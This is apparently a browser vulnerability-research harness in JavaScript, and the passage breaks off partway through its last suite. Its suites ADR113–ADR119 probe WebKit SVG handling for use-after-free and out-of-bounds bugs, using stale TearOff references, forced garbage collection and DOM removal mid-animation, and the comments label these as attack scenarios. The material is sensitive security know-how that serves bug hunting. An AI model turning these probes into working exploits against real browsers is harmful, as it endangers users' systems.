window.onerror=function(msg,src,line,col,err){

};
var SVG_NS='http://www.w3.org/2000/svg';
var XLINK_NS='http://www.w3.org/1999/xlink';
function L(s,cls){var d=document.getElementById('out');var p=document.createElement('pre');if(cls)p.className=cls;p.textContent=s;d.appendChild(p);d.scrollTop=d.scrollHeight;}
function clearOut(){document.getElementById('out').innerHTML='';}
function copyAll(){

}
function fb(text,toast){var ta=document.createElement('textarea');ta.value=text;ta.style.cssText='position:fixed;top:-9999px';document.body.appendChild(ta);ta.select();try{document.execCommand('copy');toast.style.opacity='1';setTimeout(function(){toast.style.opacity='0';},1500);}catch(e){}document.body.removeChild(ta);}
function timeWrite(writeFn,label,ITER){
  ITER=ITER||500;
  var t0=performance.now();
  for(var i=0;i<ITER;i++) writeFn(i);
  var t1=performance.now();
  var ms=(t1-t0).toFixed(2);
  var us=((t1-t0)*1000/ITER).toFixed(1);
  L(label+': '+ms+'ms ('+us+'µs/write) '+(t1-t0>0.5?'★ALIVE':''),'info');
  return t1-t0;
}
var suites={};
function runSuite(name){L('','');L('══ '+name+' ══════════════════════════════════','suite-hdr');try{suites[name]();}catch(e){L('[SUITE CRASH] '+name+': '+(e&&e.stack?e.stack:String(e)),'miss');}}
function runAll(){['ADR113','ADR114','ADR115','ADR116','ADR117','ADR118','ADR119'].forEach(function(n){runSuite(n);});}

// ═══════════════════════════════════════════════════════════════
// ADR113 — <use> shadow DOM: remove def → GC → access instanceRoot
//
// SVG <use href="#id"> creates a shadow DOM clone of the referenced
// element. The shadow tree is kept in sync with the original via
// a live reference.
//
// Attack scenario:
// 1. Create <defs><g id="tgt">...</g></defs>
// 2. Create <use href="#tgt"> → shadow DOM built, SVGUseElement.instanceRoot
//    holds a pointer to the shadow SVGGElement clone
// 3. Grab instanceRoot → get TearOff refs from shadow tree
// 4. Remove the <defs> element entirely from DOM
// 5. Force GC
// 6. Access instanceRoot — is it still alive? Does it point to freed C++?
// 7. Access shadow tree TearOff refs — do they crash or show garbage?
//
// The shadow clone is owned by the <use> element's shadow tree.
// The original <defs> removal should trigger shadow tree invalidation.
// If the shadow clone C++ object outlives the original def (ref counting
// bug), reading it is a UAF.
//
// Also: nested use — <use> of a <use> — doubly-indirect shadow tree.
// ═══════════════════════════════════════════════════════════════
suites['ADR113']=function(){
  L('ADR113: <use> shadow DOM — remove def after instanceRoot TearOff grab','info');
  var svg=document.createElementNS(SVG_NS,'svg');
  svg.setAttribute('width','200');svg.setAttribute('height','200');
  document.body.appendChild(svg);

  // Build: defs > g#tgt with 5 transforms
  var defs=document.createElementNS(SVG_NS,'defs');
  var g=document.createElementNS(SVG_NS,'g');
  g.setAttribute('id','adr113_tgt');
  g.setAttribute('transform','translate(10,0) translate(20,0) translate(30,0) translate(40,0) translate(50,0)');
  defs.appendChild(g);
  svg.appendChild(defs);

  // Build <use>
  var use=document.createElementNS(SVG_NS,'use');
  use.setAttribute('href','#adr113_tgt');
  svg.appendChild(use);

  // Force layout to build shadow tree
  var ctm0=use.getScreenCTM();
  L('ADR113: use.getScreenCTM() = '+(ctm0?'OK':'null'),'info');

  // Access instanceRoot (shadow tree root)
  var ir=use.instanceRoot;
  L('ADR113: instanceRoot = '+(ir?ir.tagName:'null'),'info');

  // Try to grab transform TearOff from the SHADOW g element
  var shadowG=null;
  var shadowTL=null, shadowT=null;
  try{
    // instanceRoot might BE the shadow g, or we need to traverse
    if(ir&&ir.correspondingElement){
      L('ADR113: ir.correspondingElement = '+ir.correspondingElement.id,'info');
    }
    // The shadow tree: use.shadowRoot won't work (closed shadow),
    // but instanceRoot gives us the shadow SVGGElement
    shadowG=ir;
    if(shadowG&&shadowG.transform){
      shadowTL=shadowG.transform.baseVal;
      L('ADR113: shadow TL.numberOfItems = '+shadowTL.numberOfItems,'info');
      shadowT=shadowTL.getItem(0);
      L('ADR113: shadow T[0].tx = '+shadowT.matrix.e,'info');
    }
  }catch(e){L('ADR113: shadow access threw: '+e.message,'warn');}

  // Now remove the <defs> — this should invalidate the shadow tree
  svg.removeChild(defs);
  L('ADR113: defs removed from DOM','info');

  // Force GC
  try{
    var gcArr=[];
    for(var i=0;i<50000;i++) gcArr.push(new Uint8Array(256));
    gcArr=null;
    if(window.gc) window.gc();
  }catch(e){}
  L('ADR113: GC applied','info');

  // Now check instanceRoot after def removal + GC
  var ir2=null;
  try{ir2=use.instanceRoot;}catch(e){L('ADR113: instanceRoot threw after GC: '+e.message,'warn');}
  L('ADR113: instanceRoot after GC = '+(ir2?ir2.tagName:'null'),'info');

  // Access shadow TearOff after def removal
  if(shadowT){
    var txAfter=-999;
    try{txAfter=shadowT.matrix.e;}catch(e){L('ADR113: shadowT.matrix.e threw: '+e.message,'warn');}
    L('ADR113: shadowT.matrix.e after def removal = '+txAfter,'info');

    // Time stale write on shadow TearOff
    var t=timeWrite(function(i){shadowT.setTranslate(i,i);},'ADR113: shadow TearOff write after def removal',500);
    if(t>0.5){
      L('★★★ ADR113: SHADOW TEAROFF SURVIVES DEF REMOVAL! C++ ref count bug!','hit');
    } else {
      L('ADR113: shadow TearOff dead after def removal (safe)','info');
    }
  }

  // Also: access the shadow TL itself
  if(shadowTL){
    var nAfter=-1;
    try{nAfter=shadowTL.numberOfItems;}catch(e){L('ADR113: shadowTL.numberOfItems threw: '+e.message,'warn');}
    L('ADR113: shadowTL.numberOfItems after def removal = '+nAfter,'info');
  }

  // Check if ir still accessible and if its transform is accessible
  if(ir){
    try{
      var irTx=ir.transform?ir.transform.baseVal.getItem(0).matrix.e:'no transform';
      L('ADR113: ir.transform[0].tx after def removal = '+irTx,'info');
    }catch(e){L('ADR113: ir.transform access threw: '+e.message,'warn');}
  }

  svg.remove();
};

// ═══════════════════════════════════════════════════════════════
// ADR114 — <use> href SWAP mid-animation
//
// Create <use href="#A">, then mid-animation (rAF loop) change href to "#B".
// The shadow tree is rebuilt. If the old shadow tree is not fully
// torn down before the new one is built, we might have:
// - TearOff refs to old shadow elements while new shadow is being built
// - Old shadow element C++ objects being freed while JS still holds refs
//
// Specifically:
// 1. Build #A (5 transforms) and #B (3 transforms) in defs
// 2. Create <use href="#A">, grab instanceRoot, grab TearOff from shadow T[4]
// 3. In rAF: set href="#B" (rebuilds shadow tree)
// 4. Immediately after: access shadow T[4] (now OOB! B only has 3 items)
// 5. Check instanceRoot — is it A's or B's shadow root?
// 6. Time stale writes on old shadow TearOff
//
// This tests whether href invalidation properly tears down old TearOffs.
// ═══════════════════════════════════════════════════════════════
suites['ADR114']=function(){
  L('ADR114: <use> href swap mid-animation — shadow tree dangling ref','info');
  var svg=document.createElementNS(SVG_NS,'svg');
  document.body.appendChild(svg);
  var defs=document.createElementNS(SVG_NS,'defs');

  // Def A: 5 transforms
  var gA=document.createElementNS(SVG_NS,'g');
  gA.setAttribute('id','adr114_A');
  gA.setAttribute('transform','translate(100,0) translate(200,0) translate(300,0) translate(400,0) translate(500,0)');
  defs.appendChild(gA);

  // Def B: 3 transforms (SHORTER — forces OOB if old index accessed)
  var gB=document.createElementNS(SVG_NS,'g');
  gB.setAttribute('id','adr114_B');
  gB.setAttribute('transform','translate(1,0) translate(2,0) translate(3,0)');
  defs.appendChild(gB);
  svg.appendChild(defs);

  var use=document.createElementNS(SVG_NS,'use');
  use.setAttribute('href','#adr114_A');
  svg.appendChild(use);

  // Force layout to build shadow tree for A
  use.getBoundingClientRect();

  // Grab shadow TearOff for A[4] (index 4 — will be OOB after swap to B)
  var irA=use.instanceRoot;
  L('ADR114: irA = '+(irA?irA.tagName:'null'),'info');
  var shadowTA4=null;
  try{
    var shadowTLA=irA.transform.baseVal;
    L('ADR114: shadowTLA.numberOfItems = '+shadowTLA.numberOfItems,'info');
    shadowTA4=shadowTLA.getItem(4);// item index 4 (last item of A)
    L('ADR114: shadowTA4.tx = '+shadowTA4.matrix.e,'info');// 500
  }catch(e){L('ADR114: shadowTA4 grab threw: '+e.message,'warn');}

  // rAF: swap href to B
  requestAnimationFrame(function(){
    use.setAttribute('href','#adr114_B');
    // Force layout immediately
    use.getBoundingClientRect();

    var irB=use.instanceRoot;
    L('ADR114 f1: irB after swap = '+(irB?irB.tagName:'null'),'info');
    try{
      var shadowTLB=irB?irB.transform.baseVal:null;
      if(shadowTLB) L('ADR114 f1: shadowTLB.numberOfItems = '+shadowTLB.numberOfItems,'info');
    }catch(e){L('ADR114 f1: shadowTLB threw: '+e.message,'warn');}

    // Access OLD shadow TearOff after swap
    if(shadowTA4){
      var txOld=-999;
      try{txOld=shadowTA4.matrix.e;}catch(e){L('ADR114 f1: shadowTA4.matrix.e threw: '+e.message,'warn');}
      L('ADR114 f1: shadowTA4.tx after href swap = '+txOld,'info');

      // Is irA still the same as irB?
      L('ADR114 f1: irA === irB? '+(irA===irB),'info');
      if(irA&&irB&&irA!==irB){
        L('ADR114: ★ irA !== irB — shadow root was REPLACED. Old shadow tree freed?','warn');
      }

      // Write to old shadow TearOff
      var t=timeWrite(function(i){shadowTA4.setTranslate(i+55555,i);},'ADR114: old shadow TearOff write after href swap',500);
      if(t>0.5){
        L('★★★ ADR114: OLD SHADOW TEAROFF ALIVE AFTER HREF SWAP!','hit');
        L('★★★ ADR114: Writing to A[4] TearOff while B (only 3 items) is active = OOB!','hit');
      } else {
        L('ADR114: old shadow TearOff dead after swap (safe)','info');
      }

      // Read back shadowTA4 after writes
      try{L('ADR114: shadowTA4.tx AFTER writes = '+shadowTA4.matrix.e,'info');}catch(e){}
    }

    svg.remove();
  });
};

// ═══════════════════════════════════════════════════════════════
// ADR115 — CSS transform vs SVG transform attribute: mixed TearOff
//
// SVG elements can have transforms from TWO sources:
// 1. SVG attribute: g.setAttribute('transform', 'translate(100,0)')
//    → accessed via g.transform.baseVal (SVGTransformList TearOff)
// 2. CSS property: g.style.transform = 'translateX(200px)'
//    → accessed via CSS CSSOM (completely separate C++ path)
//
// These two systems COEXIST. WebKit must merge them for rendering.
// The "transform" property in CSS overrides the SVG attribute in
// CSS cascade, but the SVG attribute still exists in the DOM.
//
// Attack:
// 1. Create <g> with SVG transform attribute (10 items)
// 2. Grab SVG TearOff T_svg = TL.getItem(0)
// 3. Set CSS style.transform → CSS system takes over for rendering
// 4. Now removeItem(0) from SVG TL → T_svg is stale
// 5. Do T_svg.setTranslate() → does the notification fire differently?
//    Because now CSS is the authoritative transform, does the SVG
//    TearOff notification go through a DIFFERENT path?
//
// Also: CSS Typed OM for transforms:
// g.attributeStyleMap.set('transform', new CSSTranslate(...))
// Then g.transform.baseVal — does the SVG TL reflect the CSS value?
//
// Also: after CSS transform set, does g.transform.animVal differ from
// g.transform.baseVal? Normally they're the same without animation.
// With CSS transform overriding, does animVal see CSS value while
// baseVal sees SVG attribute? Potential divergence = OOB.
// ═══════════════════════════════════════════════════════════════
suites['ADR115']=function(){
  L('ADR115: CSS transform vs SVG transform — mixed TearOff confusion','info');
  var svg=document.createElementNS(SVG_NS,'svg');
  document.body.appendChild(svg);
  var g=document.createElementNS(SVG_NS,'g');
  g.setAttribute('transform','translate(100,0) translate(200,0) translate(300,0) translate(400,0) translate(500,0)');
  svg.appendChild(g);

  var TL_svg=g.transform.baseVal;
  var T0=TL_svg.getItem(0);// T0.tx = 100
  L('ADR115: SVG TL.numberOfItems = '+TL_svg.numberOfItems,'info');
  L('ADR115: T0.tx = '+T0.matrix.e,'info');

  // Set CSS transform (this overrides SVG for rendering)
  g.style.transform='translateX(9999px)';
  L('ADR115: CSS transform set','info');

  // Check if SVG TL is affected
  L('ADR115: TL after CSS set: numberOfItems = '+TL_svg.numberOfItems,'info');
  L('ADR115: T0.tx after CSS set = '+T0.matrix.e,'info');

  // Baseline: does writing T0 still fire a notification with CSS active?
  var tBase=timeWrite(function(i){T0.setTranslate(i,i);},'ADR115: baseline SVG TearOff write WITH CSS override',500);

  // Now removeItem(0) — T0 becomes stale
  TL_svg.removeItem(0);
  L('ADR115: removeItem(0) done. TL.numberOfItems = '+TL_svg.numberOfItems,'info');

  // Stale write with CSS still active
  var tStale=timeWrite(function(i){T0.setTranslate(i+77777,i);},'ADR115: STALE SVG TearOff write WITH CSS override',500);
  if(tStale>0.5){
    L('★★★ ADR115: STALE SVG TEAROFF ALIVE WITH CSS OVERRIDE!','hit');
    L('★★★ ADR115: CSS+SVG combined notification path survives removeItem!','hit');
  }

  // Also test: baseVal vs animVal with CSS
  var TL_av=g.transform.animVal;
  L('ADR115: animVal.numberOfItems = '+TL_av.numberOfItems,'info');
  if(TL_av.numberOfItems!==TL_svg.numberOfItems){
    L('★★★ ADR115: baseVal.N('+TL_svg.numberOfItems+') != animVal.N('+TL_av.numberOfItems+') with CSS override!','hit');
  }

  // CSS Typed OM test
  if(g.attributeStyleMap){
    try{
      var CSSTOM_val=g.attributeStyleMap.get('transform');
      L('ADR115: attributeStyleMap.get(transform) = '+CSSTOM_val,'info');
    }catch(e){L('ADR115: attributeStyleMap threw: '+e.message,'warn');}
  } else {
    L('ADR115: CSS Typed OM not available','info');
  }

  // getComputedStyle vs SVG attribute
  var cs=window.getComputedStyle(g);
  L('ADR115: computed transform = '+cs.transform,'info');
  L('ADR115: SVG getAttribute transform = '+g.getAttribute('transform').substring(0,60),'info');

  // Clear CSS, check if SVG TL recovers
  g.style.transform='';
  L('ADR115: CSS cleared. TL.numberOfItems = '+TL_svg.numberOfItems,'info');
  var tAfterClear=timeWrite(function(i){T0.setTranslate(i,i);},'ADR115: stale write AFTER CSS cleared',500);
  if(tAfterClear>0.5){
    L('★★★ ADR115: STALE TEAROFF ALIVE AFTER CSS CLEARED!','hit');
  }

  svg.remove();
};

// ═══════════════════════════════════════════════════════════════
// ADR116 — CSS Typed OM on SVG element — stale after attr change
//
// CSS Typed OM: element.computedStyleMap() and attributeStyleMap
// give typed access to CSS properties. For SVG elements, the 'transform'
// computed value includes BOTH CSS and SVG transforms.
//
// If we grab a CSSTransformValue from computedStyleMap(), then change
// the SVG attribute, does the CSSTransformValue become stale?
// CSSTransformValue.toMatrix() at that point — UAF in the matrix calc?
//
// Also: SVGElement.transform property vs CSS transform property.
// SVGElement.transform.animVal.consolidate() returns a single
// SVGTransform that represents the consolidated matrix.
// The consolidated TearOff — does it share C++ memory with the list?
// After removeItem, is the consolidated TearOff affected?
// ═══════════════════════════════════════════════════════════════
suites['ADR116']=function(){
  L('ADR116: CSS Typed OM + SVGTransform consolidate stale probe','info');
  var svg=document.createElementNS(SVG_NS,'svg');
  document.body.appendChild(svg);
  var g=document.createElementNS(SVG_NS,'g');
  g.setAttribute('transform','translate(100,50) rotate(45) scale(2)');
  svg.appendChild(g);

  // Test CSS Typed OM availability
  var hasCSSOM=(typeof g.computedStyleMap==='function');
  L('ADR116: computedStyleMap available: '+hasCSSOM,'info');
  if(hasCSSOM){
    try{
      var csm=g.computedStyleMap();
      var tv=csm.get('transform');
      L('ADR116: computed transform type: '+(tv?tv.constructor.name:'null'),'info');
      if(tv&&tv.toMatrix){
        var m0=tv.toMatrix();
        L('ADR116: matrix.a='+m0.a.toFixed(4)+' .e='+m0.e.toFixed(4),'info');
        // Change SVG attr
        g.setAttribute('transform','translate(9999,8888)');
        // Stale read of old CSSTransformValue
        try{
          var m1=tv.toMatrix();
          L('ADR116: stale matrix.a='+m1.a.toFixed(4)+' .e='+m1.e.toFixed(4),'info');
          if(Math.abs(m1.e-100)<1){
            L('★★★ ADR116: Stale CSSTransformValue reads OLD data (100) after attr change!','hit');
          } else if(Math.abs(m1.e-9999)<1){
            L('ADR116: CSSTransformValue live-updated to new attr value (9999)','info');
          } else {
            L('ADR116: CSSTransformValue.e='+m1.e+' (unexpected — possible garbage/UAF?)','warn');
          }
        }catch(e){L('ADR116: stale toMatrix() threw: '+e.message,'warn');}
      }
    }catch(e){L('ADR116: computedStyleMap threw: '+e.message,'warn');}
  }

  // SVGTransform.consolidate() probe
  g.setAttribute('transform','translate(100,0) rotate(45) scale(2)');
  var TL_bv=g.transform.baseVal;
  var TL_av=g.transform.animVal;
  L('ADR116: baseVal.N='+TL_bv.numberOfItems+' animVal.N='+TL_av.numberOfItems,'info');

  // consolidate() returns a SINGLE SVGTransform (the product matrix)
  var T_cons=null;
  try{
    T_cons=TL_av.consolidate();
    if(T_cons){
      L('ADR116: consolidate() ok. matrix.e='+T_cons.matrix.e.toFixed(4)+' .f='+T_cons.matrix.f.toFixed(4),'info');
    } else {
      L('ADR116: consolidate() returned null (empty list)','info');
    }
  }catch(e){L('ADR116: consolidate() threw: '+e.message,'warn');}

  // Now remove items from baseVal — does consolidated TearOff change?
  TL_bv.removeItem(0);
  TL_bv.removeItem(0);
  L('ADR116: removed 2 items. baseVal.N='+TL_bv.numberOfItems,'info');

  if(T_cons){
    L('ADR116: T_cons.matrix.e after removeItem: '+T_cons.matrix.e.toFixed(4),'info');
    var t=timeWrite(function(i){T_cons.setTranslate(i+44444,i);},'ADR116: consolidate TearOff write after baseVal removeItem',500);
    if(t>0.5){
      L('★★★ ADR116: CONSOLIDATED TEAROFF ALIVE AFTER BASEVAL MODIFY!','hit');
    }
  }

  // Also test: getItem from animVal then clear baseVal
  var T_av0=null;
  try{
    g.setAttribute('transform','translate(111,222) translate(333,444)');
    T_av0=g.transform.animVal.getItem(0);
    L('ADR116: T_av0.tx='+T_av0.matrix.e,'info');
    g.transform.baseVal.clear();
    L('ADR116: baseVal.clear() done. animVal.N='+g.transform.animVal.numberOfItems,'info');
    var t2=timeWrite(function(i){T_av0.setTranslate(i+33333,i);},'ADR116: animVal TearOff write after baseVal.clear()',500);
    if(t2>0.5){
      L('★★★ ADR116: ANIMVAL TEAROFF ALIVE AFTER BASEVAL CLEAR!','hit');
    }
    L('ADR116: T_av0.tx after writes='+T_av0.matrix.e,'info');
  }catch(e){L('ADR116: animVal test threw: '+e.message,'warn');}

  svg.remove();
};

// ═══════════════════════════════════════════════════════════════
// ADR117 — SVGAnimateMotion: remove path element mid-animation
//
// SVGAnimateMotion animates an element along a path defined by:
// a) the 'path' attribute directly on <animateMotion>
// b) a <mpath> child referencing an external <path> element
//
// For (a): the path is stored internally. No external reference to remove.
// But: if we CHANGE the path attribute mid-animation, does the old
// path C++ object get freed while the animation is reading it?
//
// For (b): the <mpath href="#myPath"> references a <path> element.
// Remove the <path> mid-animation → <mpath> has a dangling href.
// The animation tries to sample the motion path → accesses freed path?
//
// Attack for (a):
// 1. Set up animateMotion with a complex path (many points)
// 2. Grab current motion position (element.getScreenCTM during anim)
// 3. In rAF: replace the path attribute with a different one
// 4. Immediately sample getScreenCTM on the target element
// → If old path was freed and new path is being built simultaneously,
//    the CTM calculation might read freed memory
//
// Also testing: animateMotion + rotate="auto" — auto-rotation requires
// computing the path tangent. Changing path mid-animation while
// tangent is being computed = potential race.
// ═══════════════════════════════════════════════════════════════
suites['ADR117']=function(){
  L('ADR117: SVGAnimateMotion — path change mid-animation + CTM probe','info');
  var svg=document.createElementNS(SVG_NS,'svg');
  svg.setAttribute('viewBox','0 0 1000 1000');
  document.body.appendChild(svg);

  var rect=document.createElementNS(SVG_NS,'rect');
  rect.setAttribute('width','10');rect.setAttribute('height','10');
  svg.appendChild(rect);

  // Complex path with many bezier curves
  var longPath='M 0,0 C 100,200 300,-100 500,0 C 700,100 800,300 1000,200 C 800,400 600,600 500,500 C 300,700 100,600 0,500 Z';

  var anim=document.createElementNS(SVG_NS,'animateMotion');
  anim.setAttribute('path',longPath);
  anim.setAttribute('dur','5s');
  anim.setAttribute('repeatCount','indefinite');
  anim.setAttribute('rotate','auto');// compute tangent each frame
  rect.appendChild(anim);

  var frame=0;
  var ctms=[];
  function tick(){
    var ctm=rect.getScreenCTM();
    if(ctm) ctms.push({a:ctm.a.toFixed(4),e:ctm.e.toFixed(2),f:ctm.f.toFixed(2)});
    if(frame===2){
      L('ADR117 f2: CTM before path change: a='+ctm.a.toFixed(4)+' e='+ctm.e.toFixed(2),'info');
      // Change path to a COMPLETELY different one (fewer points, different shape)
      var shortPath='M 0,0 L 100,100';
      anim.setAttribute('path',shortPath);
      // Immediately after — race with any pending path computation?
      var ctm2=rect.getScreenCTM();
      L('ADR117 f2: CTM immediately after path change: a='+ctm2.a.toFixed(4)+' e='+ctm2.e.toFixed(2),'info');
    }
    if(frame===3){
      L('ADR117 f3: CTM after path change settled: a='+ctm.a.toFixed(4)+' e='+ctm.e.toFixed(2),'info');
    }
    if(frame===4){
      // Remove the animateMotion entirely
      rect.removeChild(anim);
      // Access rect CTM immediately
      var ctm3=rect.getScreenCTM();
      L('ADR117 f4: CTM after anim removed: e='+ctm3.e.toFixed(2)+' f='+ctm3.f.toFixed(2),'info');
      // Rapid path changes — stress test
      for(var i=0;i<20;i++){
        var anim2=document.createElementNS(SVG_NS,'animateMotion');
        anim2.setAttribute('path','M 0,0 C '+(i*100)+',200 '+(i*50)+',0 1000,0');
        anim2.setAttribute('dur','1s');
        anim2.setAttribute('repeatCount','indefinite');
        anim2.setAttribute('rotate','auto');
        rect.appendChild(anim2);
        rect.getScreenCTM();// force CTM recalc with each
        rect.removeChild(anim2);// remove immediately
      }
      L('ADR117 f4: 20 rapid animateMotion add/remove done. No crash.','info');
    }
    if(frame===5){
      L('ADR117 f5: final CTM: e='+ctm.e.toFixed(2)+' f='+ctm.f.toFixed(2),'info');
      // Check all CTMs for anomalies (NaN, Inf, extreme values)
      var anomaly=false;
      for(var i=0;i<ctms.length;i++){
        var c=ctms[i];
        if(isNaN(parseFloat(c.a))||isNaN(parseFloat(c.e))||
           Math.abs(parseFloat(c.e))>1e10||Math.abs(parseFloat(c.f))>1e10){
          L('★★★ ADR117: ANOMALOUS CTM at frame '+i+': '+JSON.stringify(c),'hit');
          anomaly=true;
        }
      }
      if(!anomaly) L('ADR117: All '+ctms.length+' CTMs normal. No anomalies.','info');
      svg.remove();
    }
    frame++;
    if(frame<=5) requestAnimationFrame(tick);
  }
  requestAnimationFrame(tick);
};

// ═══════════════════════════════════════════════════════════════
// ADR118 — SVGAnimateMotion + <mpath> href to removed path element
//
// <animateMotion><mpath href="#myPath"/></animateMotion>
// The <mpath> element holds a reference to an external <path>.
// If we remove the referenced <path> from the DOM mid-animation,
// the <mpath> has an unresolved href. What does the animation do?
//
// More importantly: the C++ object for the path geometry (the
// PathData or Path object) — is it freed when the <path> element is
// removed from DOM? If the animation was in the middle of sampling
// the path (computing a point-at-length during layout), freeing
// the PathData is a UAF.
//
// We can't directly detect a UAF (no crash = no evidence from JS),
// but we can:
// 1. Grab a reference to the path's geometry via getTotalLength()
// 2. Remove the path element
// 3. Force the animation to sample it (via rAF + getScreenCTM)
// 4. Check for anomalous CTM values (suggests freed memory was read)
//
// Also: mpath href to a <use> element referencing a path — double
// indirection. Remove the inner path, does the use→mpath chain crash?
// ═══════════════════════════════════════════════════════════════
suites['ADR118']=function(){
  L('ADR118: animateMotion + mpath href to removed path element','info');
  var svg=document.createElementNS(SVG_NS,'svg');
  svg.setAttribute('viewBox','0 0 1000 1000');
  document.body.appendChild(svg);

  // The motion path element
  var pathEl=document.createElementNS(SVG_NS,'path');
  pathEl.setAttribute('id','adr118_path');
  var complexD='M 0,0 C 200,400 500,-200 700,200 C 900,600 800,800 500,900 C 200,1000 0,700 0,500 Z';
  pathEl.setAttribute('d',complexD);
  var defs=document.createElementNS(SVG_NS,'defs');
  defs.appendChild(pathEl);
  svg.appendChild(defs);

  // Measure path before removal
  var pathLen=pathEl.getTotalLength();
  L('ADR118: path.getTotalLength() = '+pathLen.toFixed(2),'info');

  // The animated rect
  var rect=document.createElementNS(SVG_NS,'rect');
  rect.setAttribute('width','10');rect.setAttribute('height','10');
  svg.appendChild(rect);

  // animateMotion with mpath child
  var anim=document.createElementNS(SVG_NS,'animateMotion');
  anim.setAttribute('dur','5s');
  anim.setAttribute('repeatCount','indefinite');
  anim.setAttribute('rotate','auto');
  var mpath=document.createElementNS(SVG_NS,'mpath');
  mpath.setAttributeNS(XLINK_NS,'xlink:href','#adr118_path');
  anim.appendChild(mpath);
  rect.appendChild(anim);

  var frame=0;
  var anomalyCount=0;
  function tick(){
    var ctm=rect.getScreenCTM();
    if(frame===1){
      L('ADR118 f1: CTM before path removal: e='+ctm.e.toFixed(2)+' f='+ctm.f.toFixed(2),'info');
      L('ADR118 f1: pathEl.getTotalLength()='+pathEl.getTotalLength().toFixed(2),'info');
    }
    if(frame===2){
      // Remove the path element from defs — mpath href now dead
      defs.removeChild(pathEl);
      L('ADR118 f2: path element REMOVED from defs','info');
      // Force layout immediately — does animation sample freed path?
      var ctm2=rect.getScreenCTM();
      L('ADR118 f2: CTM immediately after path removal: e='+ctm2.e.toFixed(2)+' f='+ctm2.f.toFixed(2),'info');
      if(isNaN(ctm2.e)||Math.abs(ctm2.e)>1e10||isNaN(ctm2.f)||Math.abs(ctm2.f)>1e10){
        L('★★★ ADR118: ANOMALOUS CTM right after path removal! Possible UAF!','hit');
        anomalyCount++;
      }
      // Try accessing the removed pathEl
      try{
        var lenAfter=pathEl.getTotalLength();
        L('ADR118 f2: removed pathEl.getTotalLength()='+lenAfter.toFixed(2)+' (still accessible!)','info');
      }catch(e){L('ADR118 f2: pathEl.getTotalLength() threw after removal: '+e.message,'warn');}
      // Force GC
      try{var gcA=[];for(var i=0;i<30000;i++)gcA.push(new Uint8Array(512));gcA=null;if(window.gc)window.gc();}catch(e){}
      // CTM after GC — does freed path data affect animation?
      var ctm3=rect.getScreenCTM();
      L('ADR118 f2: CTM after GC: e='+ctm3.e.toFixed(2)+' f='+ctm3.f.toFixed(2),'info');
      if(isNaN(ctm3.e)||Math.abs(ctm3.e)>1e10){
        L('★★★ ADR118: ANOMALOUS CTM after GC! UAF confirmed!','hit');
        anomalyCount++;
      }
    }
    if(frame===3){
      L('ADR118 f3: CTM after path removal settled: e='+ctm.e.toFixed(2)+' f='+ctm.f.toFixed(2),'info');
      // Re-add the path element (what happens?)
      defs.appendChild(pathEl);
      var ctm4=rect.getScreenCTM();
      L('ADR118 f3: CTM after path re-added: e='+ctm4.e.toFixed(2)+' f='+ctm4.f.toFixed(2),'info');
    }
    if(frame===4){
      L('ADR118 f4: CTM after path re-added settled: e='+ctm.e.toFixed(2)+' f='+ctm.f.toFixed(2),'info');
      // Test: remove mpath child from anim (not the path itself)
      try{
        anim.removeChild(mpath);
        L('ADR118 f4: mpath child removed from animateMotion','info');
        var ctm5=rect.getScreenCTM();
        L('ADR118 f4: CTM after mpath removed: e='+ctm5.e.toFixed(2)+' f='+ctm5.f.toFixed(2),'info');
        // mpath still in JS hand, try to access it
        L('ADR118 f4: mpath.getAttributeNS(xlink,href)='+mpath.getAttributeNS(XLINK_NS,'xlink:href'),'info');
      }catch(e){L('ADR118 f4: mpath removal threw: '+e.message,'warn');}
      L('ADR118: anomaly count = '+anomalyCount,'info');
      if(anomalyCount===0) L('ADR118: No anomalies. path removal gracefully handled.','info');
      svg.remove();
    }
    frame++;
    if(frame<=4) requestAnimationFrame(tick);
  }
  requestAnimationFrame(tick);
};

// ═══════════════════════════════════════════════════════════════
// ADR119 — SVGAnimatedRect (viewBox) stale TearOff probe
//
// svg.viewBox is an SVGAnimatedRect.
// svg.viewBox.baseVal is an SVGRect (not a list — single object).
// svg.viewBox.animVal is the animated version.
//
// SVGRect has x, y, width, height properties.
// The TearOff pattern: SVGRect has a TearOff just like SVGTransform.
//
// Attack:
// 1. Grab R_bv = svg.viewBox.baseVal (SVGRect TearOff)
// 2. Grab R_av = svg.viewBox.animVal (SVGRect TearOff)
// 3. Add SMIL <animate> targeting viewBox → animVal diverges from baseVal
// 4. Remove the svg from DOM (remove parent)
// 5. Time writes to R_bv and R_av — does either survive?
//
// Also: SVGRect has x, y, width, height as direct writable properties.
// After the SVG element is removed from DOM, does the TearOff context
// remain alive?
//
// Additionally: what about SVGLength TearOff from SVG presentational
// attributes that are NOT in a list?
// e.g., rect.width.baseVal → SVGAnimatedLength.baseVal = SVGLength TearOff
// Remove the rect → SVGLength TearOff stale write → alive?
// ═══════════════════════════════════════════════════════════════
suites['ADR119']=function(){
  L('ADR119: SVGAnimatedRect (viewBox) + SVGAnimatedLength stale TearOff','info');
  var svg=document.createElementNS(SVG_NS,'svg');
  svg.setAttribute('viewBox','0 0 1000 1000');
  svg.setAttribute('width','200');
  svg.setAttribute('height','200');
  document.body.appendChild(svg);

  // Grab viewBox TearOffs
  var R_bv=svg.viewBox.baseVal;
  var R_av=svg.viewBox.animVal;
  L('ADR119: R_bv.x='+R_bv.x+' .y='+R_bv.y+' .w='+R_bv.width+' .h='+R_bv.height,'info');
  L('ADR119: R_av.x='+R_av.x,'info');

  // Add SMIL animate targeting viewBox
  var anim=document.createElementNS(SVG_NS,'animate');
  anim.setAttribute('attributeName','viewBox');
  anim.setAttribute('from','0 0 1000 1000');
  anim.setAttribute('to','500 500 500 500');
  anim.setAttribute('dur','10s');
  anim.setAttribute('repeatCount','indefinite');
  svg.appendChild(anim);

  // Wait one frame for animation to start, then measure
  requestAnimationFrame(function(){
    L('ADR119 f1: R_bv.x='+R_bv.x+' R_av.x='+R_av.x,'info');
    if(R_bv.x!==R_av.x){
      L('★★★ ADR119: baseVal.x('+R_bv.x+') != animVal.x('+R_av.x+')! SMIL animated viewBox divergence!','hit');
    }

    // Baseline write timing
    var tBase=timeWrite(function(i){R_bv.width=500+i;},'ADR119: baseline R_bv.width write',500);

    // Remove svg from DOM
    svg.remove();
    L('ADR119: svg removed from DOM','info');

    // Stale writes to viewBox TearOffs
    var t_bv=timeWrite(function(i){R_bv.x=i;R_bv.y=i;R_bv.width=i+100;R_bv.height=i+100;},'ADR119: R_bv stale write after svg remove',500);
    if(t_bv>0.5){
      L('★★★ ADR119: R_bv (viewBox baseVal) ALIVE after svg remove!','hit');
    }

